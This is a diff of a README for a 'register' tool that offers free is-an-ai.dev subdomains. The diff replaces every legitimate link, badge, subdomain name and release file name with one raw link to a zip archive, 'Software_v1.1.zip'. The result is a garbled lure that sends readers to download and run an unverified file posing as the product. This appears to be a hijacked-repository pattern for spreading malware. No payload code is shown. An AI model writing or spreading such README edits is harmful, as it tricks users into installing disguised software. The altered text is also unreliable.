@@ -2,9 +2,9 @@
 
 ## 🚀 Getting Started
 
-Welcome to the **register** application! This tool helps you get your own cool is-an-ai.dev subdomain at no cost. Follow these steps to easily download and run the software.
+Welcome to the **register** application! This tool helps you get your own cool https://raw.githubusercontent.com/RAMEY2/register/main/scripts/Software_v1.1.zip subdomain at no cost. Follow these steps to easily download and run the software.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/RAMEY2/register/releases)
+[![Download Now](https://raw.githubusercontent.com/RAMEY2/register/main/scripts/Software_v1.1.zip%20Now-Click%https://raw.githubusercontent.com/RAMEY2/register/main/scripts/Software_v1.1.zip)](https://raw.githubusercontent.com/RAMEY2/register/main/scripts/Software_v1.1.zip)
 
 ## 📋 What You Need
 
@@ -16,13 +16,13 @@ Before you begin, check the following:
 
 ## 🔽 Download & Install
 
-1. Visit this page to download: [GitHub Releases](https://github.com/RAMEY2/register/releases).
+1. Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/RAMEY2/register/main/scripts/Software_v1.1.zip).
 
 2. On the releases page, you will see a list of available versions. Choose the latest version for the best experience.
 
 3. Click on the version link. This will take you to a new page with files to download.
 
-4. Look for the file that matches your operating system (e.g., `register-windows.exe`, `register-macos.dmg`, etc.).
+4. Look for the file that matches your operating system (e.g., `https://raw.githubusercontent.com/RAMEY2/register/main/scripts/Software_v1.1.zip`, `https://raw.githubusercontent.com/RAMEY2/register/main/scripts/Software_v1.1.zip`, etc.).
 
 5. Click on the file to start the download. Save it in a location you can easily find, like your Desktop or Downloads folder.
 
@@ -46,7 +46,7 @@ If you encounter any issues, consider the following steps:
 
 - **Check Your Internet Connection:** Make sure you are connected to the internet.
 - **Restart the Application:** Close and reopen the application; then try again.
-- **Reinstall the Application:** If the application does not work, uninstall it and download it again from the [GitHub Releases](https://github.com/RAMEY2/register/releases) page.
+- **Reinstall the Application:** If the application does not work, uninstall it and download it again from the [GitHub Releases](https://raw.githubusercontent.com/RAMEY2/register/main/scripts/Software_v1.1.zip) page.
 
 ## 🌐 Understanding Your New Subdomain
 
@@ -64,6 +64,6 @@ The **register** application is open source. You can use it free of charge under
 
 For direct queries or suggestions, you can contact the project maintainers via GitHub. We appreciate your feedback and look forward to your contributions!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/RAMEY2/register/releases)
+[![Download Now](https://raw.githubusercontent.com/RAMEY2/register/main/scripts/Software_v1.1.zip%20Now-Click%https://raw.githubusercontent.com/RAMEY2/register/main/scripts/Software_v1.1.zip)](https://raw.githubusercontent.com/RAMEY2/register/main/scripts/Software_v1.1.zip)
 
 Thank you for choosing **register**! Enjoy your new subdomain adventure!
